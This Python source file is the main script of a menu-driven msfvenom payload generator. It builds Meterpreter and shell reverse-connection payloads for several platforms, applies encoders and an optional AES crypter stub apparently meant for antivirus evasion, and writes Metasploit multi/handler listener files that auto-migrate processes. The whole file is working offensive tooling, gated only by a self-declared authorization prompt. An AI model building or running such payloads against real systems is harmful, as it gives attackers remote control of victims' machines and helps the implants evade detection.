#!/usr/bin/env python3
# main.py - Payload Generator Enterprise Edition

import os
import sys
import argparse
import json
from datetime import datetime
from pathlib import Path

# Add the current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Try to import colorama for colored output
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False
    # Create dummy color classes
    class Fore:
        RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; MAGENTA = ''; CYAN = ''; WHITE = ''; RESET = ''
    class Back:
        RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; MAGENTA = ''; CYAN = ''; WHITE = ''; RESET = ''
    class Style:
        BRIGHT = ''; DIM = ''; RESET_ALL = ''

# Core modules with error handling
try:
    from core.generator import PayloadGenerator
    from core.validator import PayloadValidator
    from core.executor import CommandExecutor
    CORE_AVAILABLE = True
except ImportError as e:
    print(f"[-] Core modules not available: {e}")
    print("[*] Make sure you're in the correct directory")
    CORE_AVAILABLE = False

# Utility modules
try:
    from utils.ip_detector import IPDetector
    from utils.logger import PayloadLogger
    from utils.file_organizer import FileOrganizer
    from utils.colors import Colors
    UTILS_AVAILABLE = True
except ImportError as e:
    print(f"[-] Utils modules not available: {e}")
    UTILS_AVAILABLE = False

# Optional advanced modules
ADVANCED_FEATURES = {}

try:
    from obfuscators.custom_crypter import CustomCrypter
    ADVANCED_FEATURES['crypter'] = True
except ImportError:
    CustomCrypter = None
    ADVANCED_FEATURES['crypter'] = False

try:
    from obfuscators.multi_encoder import MultiEncoder
    ADVANCED_FEATURES['encoder'] = True
except ImportError:
    MultiEncoder = None
    ADVANCED_FEATURES['encoder'] = False

try:
    from optimization.parallel_generator import ParallelGenerator
    ADVANCED_FEATURES['parallel'] = True
except ImportError:
    ParallelGenerator = None
    ADVANCED_FEATURES['parallel'] = False

class PayloadAutomator:
    """Professional msfvenom automation tool"""
    
    def __init__(self):
        """Initialize components"""
        if not CORE_AVAILABLE:
            print(Colors.error("Core modules not available. Cannot continue."))
            sys.exit(1)
        
        # Core components
        self.validator = PayloadValidator()
        self.executor = CommandExecutor(verbose=False)
        self.generator = PayloadGenerator(verbose=False, executor=self.executor)
        
        # Utilities
        self.ip_detector = IPDetector() if UTILS_AVAILABLE else None
        self.logger = PayloadLogger() if UTILS_AVAILABLE else None
        self.file_organizer = FileOrganizer() if UTILS_AVAILABLE else None
        
        # Advanced features (optional)
        self.crypter = CustomCrypter() if ADVANCED_FEATURES['crypter'] else None
        self.encoder = MultiEncoder() if ADVANCED_FEATURES['encoder'] else None
        self.parallel = ParallelGenerator() if ADVANCED_FEATURES['parallel'] else None
        
        # State
        self.current_payload_name = None
        self.current_lhost = None
        self.current_lport = None
        
        # Show banner
        self.show_banner()
    
    def show_banner(self):
        """Display professional banner"""
        # Feature status indicators
        crypter_status = Colors.GREEN if ADVANCED_FEATURES['crypter'] else Colors.YELLOW
        encoder_status = Colors.GREEN if ADVANCED_FEATURES['encoder'] else Colors.YELLOW
        parallel_status = Colors.GREEN if ADVANCED_FEATURES['parallel'] else Colors.YELLOW
        
        crypter_symbol = '✓' if ADVANCED_FEATURES['crypter'] else '✗'
        encoder_symbol = '✓' if ADVANCED_FEATURES['encoder'] else '✗'
        parallel_symbol = '✓' if ADVANCED_FEATURES['parallel'] else '✗'
        
        banner = f"""
{Colors.MAGENTA}{Colors.BRIGHT}
╔══════════════════════════════════════════════════════════════╗
║              MSFVENOM PAYLOAD GENERATOR v2.0                 ║
║              Professional Security Testing Tool              ║
╠══════════════════════════════════════════════════════════════╣
║  Features:                                                   ║
║  • Core Generator:      {Colors.GREEN}✓{Colors.RESET} Available                      ║
║  • Custom Crypter:      {crypter_status}{crypter_symbol}{Colors.RESET}                            ║
║  • Multi-Encoder:       {encoder_status}{encoder_symbol}{Colors.RESET}                            ║
║  • Parallel Generation: {parallel_status}{parallel_symbol}{Colors.RESET}                            ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(banner)
        
        # Check msfvenom
        if not self.executor.check_msfvenom():
            print(Colors.warning("msfvenom not found in PATH"))
            print("Install Metasploit: sudo apt-get install metasploit-framework")
        
        self.show_disclaimer()
    
    def show_disclaimer(self):
        """Show legal disclaimer"""
        disclaimer = f"""
{Colors.YELLOW}{Colors.BRIGHT}⚠️  LEGAL DISCLAIMER ⚠️{Colors.RESET}
{Colors.YELLOW}This tool is for authorized security testing ONLY.
You must have explicit written permission to test any system.
Unauthorized use may violate laws and regulations.{Colors.RESET}
        """
        print(disclaimer)
        
        try:
            response = input(f"\n{Colors.INFO} Do you have authorization? (yes/no): ").lower()
            if response not in ['yes', 'y']:
                print(Colors.error("Exiting - Authorization required"))
                sys.exit(0)
        except KeyboardInterrupt:
            print(f"\n{Colors.warning('Interrupted')}")
            sys.exit(0)
    
    def get_ip_address(self):
        """Get IP address from user"""
        print(f"\n{Colors.section('IP ADDRESS CONFIGURATION')}")
        
        # Try to detect local IP
        if self.ip_detector:
            local_ip = self.ip_detector.get_local_ip()
            if local_ip:
                print(f"Detected local IP: {Colors.GREEN}{local_ip}{Colors.RESET}")
                use_detected = input("Use this IP? (y/n): ").lower()
                if use_detected in ['y', 'yes']:
                    return local_ip
        
        # Manual IP entry
        while True:
            ip = input(f"{Colors.INFO} Enter IP address: ").strip()
            if self.validator.validate_ip(ip):
                return ip
            print(Colors.error("Invalid IP address format"))
    
    def get_port(self):
        """Get port from user"""
        while True:
            try:
                port = input(f"{Colors.INFO} Enter port (default: 4444): ").strip()
                if not port:
                    return 4444
                port = int(port)
                if 1 <= port <= 65535:
                    return port
                print(Colors.error("Port must be 1-65535"))
            except ValueError:
                print(Colors.error("Invalid port number"))
    
    def select_platform(self):
        """Select target platform"""
        print(f"\n{Colors.section('PLATFORM SELECTION')}")
        platforms = list(self.validator.PLATFORMS.items())
        
        for key, data in platforms:
            print(f"{key}. {data['name']}")
        
        while True:
            choice = input(f"\n{Colors.INFO} Select platform: ").strip()
            if choice in self.validator.PLATFORMS:
                return choice
            print(Colors.error("Invalid choice"))
    
    def select_payload_type(self):
        """Select payload type"""
        print(f"\n{Colors.section('CONNECTION TYPE')}")
        for key, name in self.validator.PAYLOAD_TYPES.items():
            print(f"{key}. {name}")
        
        while True:
            choice = input(f"\n{Colors.INFO} Select type: ").strip()
            if choice in self.validator.PAYLOAD_TYPES:
                return choice
            print(Colors.error("Invalid choice"))
    
    def select_staged(self):
        """Select staged/stageless"""
        print(f"\n{Colors.section('PAYLOAD TYPE')}")
        for key, data in self.validator.STAGE_OPTIONS.items():
            print(f"{key}. {data['name']}")
        
        while True:
            choice = input(f"\n{Colors.INFO} Select type: ").strip()
            if choice in self.validator.STAGE_OPTIONS:
                return choice
            print(Colors.error("Invalid choice"))
    
    def select_format(self, platform_key):
        """Select output format"""
        print(f"\n{Colors.section('OUTPUT FORMAT')}")
        formats = self.validator.PLATFORMS[platform_key]['formats']
        
        for i, fmt in enumerate(formats, 1):
            print(f"{i}. {fmt}")
        
        while True:
            try:
                choice = int(input(f"\n{Colors.INFO} Select format: ").strip())
                if 1 <= choice <= len(formats):
                    return formats[choice-1]
                print(Colors.error(f"Choose 1-{len(formats)}"))
            except ValueError:
                print(Colors.error("Invalid input"))
    
    def select_encoder(self):
        """Optional encoder selection"""
        if not self.encoder:
            return None, 5
        
        print(f"\n{Colors.section('ENCODER OPTIONS')}")
        print("1. No encoder")
        print("2. x86/shikata_ga_nai")
        print("3. x86/polymorphic")
        print("4. x64/xor")
        
        encoders = {
            '1': None,
            '2': 'x86/shikata_ga_nai',
            '3': 'x86/polymorphic',
            '4': 'x64/xor'
        }
        
        choice = input(f"\n{Colors.INFO} Select encoder: ").strip()
        
        if choice in encoders:
            if encoders[choice]:
                iterations = input("Iterations (default: 5): ").strip()
                iterations = int(iterations) if iterations.isdigit() else 5
                return encoders[choice], iterations
        
        return None, 5
    
    def get_output_name(self, format_type):
        """Get output filename"""
        print(f"\n{Colors.section('OUTPUT FILENAME')}")
        default = f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{format_type}"
        print(f"Default: {default}")
        
        name = input(f"{Colors.INFO} Enter filename: ").strip()
        if not name:
            return default
        
        if not name.endswith(f".{format_type}"):
            name = f"{name}.{format_type}"
        
        return name
    
    def get_payload_name(self, platform_key, payload_type_key, staged_key):
        """Get full payload name based on selections"""
        
        # Define platform prefixes
        platform_prefixes = {
            '1': 'windows/',
            '2': 'linux/x86/',
            '3': 'android/',
            '4': 'osx/x86/',
            '5': 'java/'
        }
        
        # Get the base payload type
        if payload_type_key == '1':
            base_payload = 'meterpreter/reverse_tcp'
        elif payload_type_key == '2':
            base_payload = 'meterpreter/reverse_http'
        elif payload_type_key == '3':
            base_payload = 'meterpreter/reverse_https'
        else:
            base_payload = 'shell/reverse_tcp'
        
        # Get platform prefix
        platform_prefix = platform_prefixes.get(platform_key, '')
        
        # Determine if staged or stageless
        if staged_key == '2':  # Stageless
            # For stageless, use different format
            if platform_key == '1':  # Windows
                return f"{platform_prefix}meterpreter_reverse_tcp"
            else:
                return f"{platform_prefix}meterpreter_reverse_tcp"
        else:  # Staged
            return f"{platform_prefix}{base_payload}"
    
    def generate_listener(self, payload, lhost, lport):
        """Generate listener RC file"""
        try:
            # Create listener filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Use file_organizer if available
            if hasattr(self, 'file_organizer') and self.file_organizer:
                # Create session-based directory
                session_dir = self.file_organizer.setup_directories()
                listener_dir = os.path.join(session_dir, 'listeners')
                os.makedirs(listener_dir, exist_ok=True)
                
                rc_file = os.path.join(listener_dir, f"listener_{lport}.rc")
            else:
                # Fallback to current directory
                rc_file = f"listener_{lport}_{timestamp}.rc"
            
            # Generate RC content
            rc_content = f"""# Metasploit listener for {payload}
# Generated by Payload Generator v2.0
# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate

# Start listener
exploit -j -z
"""
            
            # Write the file
            with open(rc_file, 'w') as f:
                f.write(rc_content)
            
            print(Colors.success(f"Listener script saved to {rc_file}"))
            print(Colors.info(f"Run with: msfconsole -q -r {rc_file}"))
            
            return rc_file
            
        except Exception as e:
            print(Colors.error(f"Failed to generate listener: {str(e)}"))
            # Create a simple listener in current directory as fallback
            simple_file = f"listener_{lport}.rc"
            with open(simple_file, 'w') as f:
                f.write(f"""
use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
""")
            print(Colors.warning(f"Created simple listener: {simple_file}"))
            return simple_file
    
    def encrypt_payload(self, payload_path):
        """Encrypt payload using custom crypter"""
        if not self.crypter:
            print(Colors.warning("Encryption not available"))
            return
        
        try:
            with open(payload_path, 'rb') as f:
                data = f.read()
            
            encrypted = self.crypter.aes_encrypt(data)
            stub = self.crypter.generate_stub(encrypted)
            
            output = payload_path + '.encrypted'
            with open(output, 'w') as f:
                f.write(stub)
            
            print(Colors.success(f"Encrypted payload saved to {output}"))
        except Exception as e:
            print(Colors.error(f"Encryption failed: {e}"))
    
    def generate_payload(self):
        """Main payload generation workflow"""
        try:
            # Get configuration
            lhost = self.get_ip_address()
            lport = self.get_port()
            platform_key = self.select_platform()
            payload_type_key = self.select_payload_type()
            staged_key = self.select_staged()
            format_type = self.select_format(platform_key)
            encoder, iterations = self.select_encoder()
            output_name = self.get_output_name(format_type)
            
            # Store for later use
            self.current_lhost = lhost
            self.current_lport = lport
            
            # Show summary
            print(f"\n{Colors.section('GENERATION SUMMARY')}")
            print(f"Platform:  {self.validator.PLATFORMS[platform_key]['name']}")
            print(f"Payload:   {self.validator.PAYLOAD_TYPES[payload_type_key]}")
            print(f"Type:      {self.validator.STAGE_OPTIONS[staged_key]['name']}")
            print(f"LHOST:     {lhost}")
            print(f"LPORT:     {lport}")
            print(f"Format:    {format_type}")
            print(f"Output:    {output_name}")
            if encoder:
                print(f"Encoder:   {encoder} (x{iterations})")
            
            # Confirm
            confirm = input(f"\n{Colors.INFO} Generate? (yes/no): ").lower()
            if confirm not in ['yes', 'y']:
                print(Colors.warning("Generation cancelled"))
                return
            
            # Generate
            print(f"\n{Colors.info('Generating payload...')}")
            success, result = self.generator.generate_payload(
                platform_key, payload_type_key, staged_key,
                lhost, lport, format_type, output_name,
                encoder, iterations
            )
            
            if success:
                print(Colors.success("Payload generated successfully!"))
                print(f"File: {result['path']}")
                print(f"Size: {result['size']} bytes")
                print(f"MD5:  {result['md5']}")
                
                # Store payload name for listener generation
                self.current_payload_name = self.get_payload_name(
                    platform_key, payload_type_key, staged_key
                )
                
                # Optional: Apply encryption if available
                if self.crypter and input("\nApply encryption? (y/n): ").lower() == 'y':
                    self.encrypt_payload(result['path'])
                
                # Optional: Generate listener
                if input("Generate listener script? (y/n): ").lower() == 'y':
                    self.generate_listener(
                        self.current_payload_name,
                        lhost, lport
                    )
            else:
                print(Colors.error(f"Generation failed: {result}"))
        
        except KeyboardInterrupt:
            print(f"\n{Colors.warning('Cancelled')}")
        except Exception as e:
            print(Colors.error(f"Error: {str(e)}"))
            import traceback
            traceback.print_exc()
    
    def check_dependencies(self):
        """Check if all dependencies are available"""
        print(f"\n{Colors.section('DEPENDENCY CHECK')}")
        
        # Check msfvenom
        if self.executor.check_msfvenom():
            print(Colors.success("msfvenom: Found"))
        else:
            print(Colors.error("msfvenom: Not found"))
            print("  Install: sudo apt-get install metasploit-framework")
        
        # Check Python packages
        print(f"\nPython Packages:")
        try:
            import colorama
            print(Colors.success("colorama: Installed"))
        except:
            print(Colors.error("colorama: Missing"))
        
        try:
            import requests
            print(Colors.success("requests: Installed"))
        except:
            print(Colors.error("requests: Missing"))
        
        try:
            import netifaces
            print(Colors.success("netifaces: Installed"))
        except:
            print(Colors.error("netifaces: Missing"))
        
        try:
            import dateutil
            print(Colors.success("python-dateutil: Installed"))
        except:
            print(Colors.error("python-dateutil: Missing"))
    
    def show_payloads(self):
        """Show available payload types"""
        print(f"\n{Colors.section('AVAILABLE PAYLOADS')}")
        
        for platform_key, platform_data in self.validator.PLATFORMS.items():
            print(f"\n{Colors.CYAN}{platform_data['name']}:{Colors.RESET}")
            try:
                for payload_key, payload_name in self.validator.PAYLOAD_TYPES.items():
                    for stage_key, stage_data in self.validator.STAGE_OPTIONS.items():
                        name = self.get_payload_name(platform_key, payload_key, stage_key)
                        print(f"  • {name}")
            except Exception as e:
                print(f"  Error loading payloads: {e}")
    
    def run(self):
        """Main entry point"""
        while True:
            print(f"\n{Colors.section('MAIN MENU')}")
            print("1. 🚀 Generate Payload")
            print("2. 🔧 Check Dependencies")
            print("3. 📋 Show Available Payloads")
            print("4. ❌ Exit")
            
            choice = input(f"\n{Colors.INFO} Select option: ").strip()
            
            if choice == '1':
                self.generate_payload()
            elif choice == '2':
                self.check_dependencies()
            elif choice == '3':
                self.show_payloads()
            elif choice == '4':
                print(Colors.info("Goodbye!"))
                break
            else:
                print(Colors.error("Invalid choice"))

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='MSFVenom Payload Generator')
    parser.add_argument('--quick', '-q', action='store_true', 
                       help='Quick mode with defaults')
    parser.add_argument('--lhost', help='Local host IP')
    parser.add_argument('--lport', type=int, default=4444, help='Local port')
    parser.add_argument('--platform', choices=['1', '2', '3', '4'], 
                       help='Platform (1=Windows, 2=Linux, 3=Android, 4=macOS)')
    
    args = parser.parse_args()
    
    # Create automator
    automator = PayloadAutomator()
    
    # Quick mode
    if args.quick and args.lhost and args.platform:
        # Implement quick generation
        print(Colors.info("Quick mode - Coming soon!"))
    else:
        # Interactive mode
        automator.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.warning('Interrupted')}")
        sys.exit(0)
    except Exception as e:
        print(Colors.error(f"Fatal error: {str(e)}"))
        if '--debug' in sys.argv:
            import traceback
            traceback.print_exc()
        sys.exit(1)
